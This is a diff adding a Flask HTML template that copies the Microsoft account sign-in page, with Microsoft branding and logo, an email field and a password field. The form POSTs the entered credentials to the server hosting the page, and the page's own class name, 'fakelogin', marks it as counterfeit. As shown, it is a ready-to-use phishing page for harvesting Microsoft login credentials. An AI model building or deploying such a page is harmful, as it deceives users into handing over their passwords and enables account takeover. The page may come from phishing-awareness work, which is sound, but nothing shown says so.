@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Sign in to your Microsoft account</title>
+  <link rel="icon" type="image/png" href="{{ url_for('static', filename='images/favi_ms.png') }}">
+  <link rel="stylesheet" href="{{ url_for('static', filename='style1.css') }}">
+</head>
+
+<body class="fakelogin">
+
+  <main class="ms-card">
+    <div class="ms-branding">
+      <img class="ms-logo" src="{{ url_for('static', filename='images/ms-logo.png') }}" alt="Microsoft">
+      <span class="ms-text">Microsoft</span>
+    </div>
+
+    <h1 class="ms-header">Sign in</h1>
+
+    <form method="POST">
+      <label for="email" class="sr-only">Email, phone, or Skype</label>
+      <input id="email"
+             class="ms-input"
+             type="email"
+             name="email"
+             placeholder="Email, phone, or Skype"
+             autocomplete="username"
+             required
+             value="{{ prefill_email|e }}">
+
+      <label for="password" class="sr-only">Password</label>
+      <input id="password"
+             class="ms-input"
+             type="password"
+             name="password"
+             placeholder="Password"
+             autocomplete="current-password"
+             required>
+
+      <div class="options">
+        <label>
+          <input type="checkbox" name="remember">
+          Keep me signed in
+        </label>
+        <a href="#" class="link">Forgot password?</a>
+      </div>
+
+      <button type="submit" class="ms-btn">Sign in</button>
+    </form>
+
+    <div class="alt-actions">
+      <a href="#" class="link">Sign‑in options</a>
+    </div>
+  </main>
+
+  <footer class="ms-footer">
+    <a href="#" class="link">Help</a>
+      <span></span>
+    <a href="#" class="link">Terms of use</a>
+    <span></span>
+    <a href="#" class="link"> Privacy and cookies</a>
+  </footer>
+
+  <div class="ms-footer-note">
+    Use private browsing if this is not your device.
+    <a href="#" class="link">Learn more</a>
+  </div>
+
+</body>
+</html>
